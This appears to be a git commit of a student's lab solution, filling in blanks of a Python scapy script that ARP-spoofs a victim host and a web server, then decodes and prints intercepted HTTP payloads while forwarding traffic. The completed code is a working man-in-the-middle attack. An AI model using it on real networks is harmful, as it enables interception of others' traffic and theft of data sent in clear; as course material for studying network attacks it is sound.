7a8e9e2d2b2a4c9eb186f9d64137fb19922b503a
SarahMBI <sboswellinnis@gmail.com>
2024-10-15 19:26:18 -0400

    solution submission

--- code/arpspoof.py
+++ code/arpspoof.py
@@ -22,14 +22,16 @@ def perform_spoof(victim_ip, victim_mac, spoofed_ip):
                        # correctly perform the arp spoof to the victim.
                        # refer to https://scapy.readthedocs.io/en/latest/api/scapy.layers.l2.html
                        # for information
-                       pdst=,
-                       hwdst=,
-                       psrc=,
-                       hwsrc=,
+                       pdst = victim_ip,
+                       hwdst = victim_mac,
+                       psrc = spoofed_ip,
+                       hwsrc = MY_MAC,
                        hwlen=6,
                        plen=4)
 
     # Send the ARP spoof packet
+    print(f"Victim IP: {victim_ip}, Victim MAC: {victim_mac}, Spoofed IP: {spoofed_ip}")
+
     sendp(ethernet_frame / arp_response, verbose=False)
 
 
@@ -44,8 +46,9 @@ def process_http_packets(pkt):
                 # is being carried. pkt[Raw] carries a bytes.  pkt[Raw].load will
                 # return a bytes. refer to https://docs.python.org/3/library/stdtypes.html#bytes.decode
                 # to get an ascii codes string 
-                tcp_payload = # add call to decode bytes here 
-                print(tcp_payload)
+                tcp_payload = pkt[Raw].load 
+                decoded_payload = tcp_payload.decode('utf-8', errors='strict')
+                print(decoded_payload)
             send(pkt, verbose=False)
 
         return
@@ -55,13 +58,13 @@ def main():
     print("Starting Packet Sniffing")
 
     # TODO - get the ip of host1 using a function in the socket library (https://docs.python.org/3/library/socket.html)
-    host1_ip = socket.<add_function_here>()
+    host1_ip = socket.gethostbyname("host1"); 
     print("detected host1 ip : %s " % host1_ip)
     host1_mac = get_mac(host1_ip)
     print("detected host1 mac : %s " % host1_mac)
 
  # TODO - get the ip of web_server using a function in the socket library (https://docs.python.org/3/library/socket.html)
-    web_server_ip = socket.<add_function_here>()
+    web_server_ip = socket.gethostbyname("web_server")
     print("detected web_server ip : %s " % web_server_ip)
     web_server_mac = get_mac(web_server_ip)
     print("detected web_server mac : %s " % web_server_mac)
